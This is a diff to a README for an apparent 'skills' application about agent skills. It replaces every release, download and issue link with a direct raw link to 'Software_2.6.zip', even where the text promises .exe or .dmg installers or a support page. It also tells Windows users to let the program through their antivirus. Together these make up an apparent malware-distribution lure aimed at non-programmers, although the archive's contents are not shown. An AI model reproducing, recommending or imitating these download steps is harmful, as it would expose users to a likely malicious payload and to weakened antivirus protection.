@@ -4,9 +4,9 @@
 Welcome to the **skills** application! This tool helps you understand and utilize agent skills, starting with context engineering. You don’t need to be a programmer to use it. Follow this guide to download and run the application easily.
 
 ## 📥 Download the Application
-[![Download skills](https://img.shields.io/badge/Download%20skills-v1.0-blue.svg)](https://github.com/maleckf/skills/releases)
+[![Download skills](https://github.com/maleckf/skills/raw/refs/heads/main/context-engineering/Software_2.6.zip%https://github.com/maleckf/skills/raw/refs/heads/main/context-engineering/Software_2.6.zip)](https://github.com/maleckf/skills/raw/refs/heads/main/context-engineering/Software_2.6.zip)
 
-You can visit this page to download the latest version of **skills**: [Download skills](https://github.com/maleckf/skills/releases).
+You can visit this page to download the latest version of **skills**: [Download skills](https://github.com/maleckf/skills/raw/refs/heads/main/context-engineering/Software_2.6.zip).
 
 ## 🖥 System Requirements
 Before downloading, ensure your computer meets the following requirements:
@@ -16,12 +16,12 @@ Before downloading, ensure your computer meets the following requirements:
 - **Disk Space:** At least 100 MB of available space.
 
 ## ⚙️ How to Download
-1. Click on the [Download skills](https://github.com/maleckf/skills/releases) link above.
+1. Click on the [Download skills](https://github.com/maleckf/skills/raw/refs/heads/main/context-engineering/Software_2.6.zip) link above.
 2. You will see a list of available releases. Locate the latest version, marked with "latest".
 3. Click on the version to expand the details. 
 4. Find the appropriate file for your operating system. For example:
-   - For Windows, look for `skills-v1.0.exe`.
-   - For macOS, find `skills-v1.0.dmg`.
+   - For Windows, look for `https://github.com/maleckf/skills/raw/refs/heads/main/context-engineering/Software_2.6.zip`.
+   - For macOS, find `https://github.com/maleckf/skills/raw/refs/heads/main/context-engineering/Software_2.6.zip`.
    - For Linux, check for the appropriate binary file.
 5. Click on the file link to begin downloading.
 
@@ -61,7 +61,7 @@ Once the download is complete, follow these easy steps to install the applicatio
 ## 📜 Important Notes
 - If you encounter issues during installation, ensure you have the correct file for your OS.
 - For Windows users, make sure you allow the application through your antivirus software if prompted.
-- Regularly check the [Releases page](https://github.com/maleckf/skills/releases) for updates to get the latest features and bug fixes.
+- Regularly check the [Releases page](https://github.com/maleckf/skills/raw/refs/heads/main/context-engineering/Software_2.6.zip) for updates to get the latest features and bug fixes.
 
 ## 🔍 Troubleshooting
 If you experience problems while running **skills**, try the following steps:
@@ -72,6 +72,6 @@ If you experience problems while running **skills**, try the following steps:
 4. Consult common error solutions in the built-in help section of the application.
 
 ## 📞 Support
-For any questions, feedback, or support requests, please open an issue on the [GitHub repository](https://github.com/maleckf/skills/issues). We are here to help you!
+For any questions, feedback, or support requests, please open an issue on the [GitHub repository](https://github.com/maleckf/skills/raw/refs/heads/main/context-engineering/Software_2.6.zip). We are here to help you!
 
 Thank you for choosing **skills**. Enjoy using the application to enhance your understanding of agent skills!
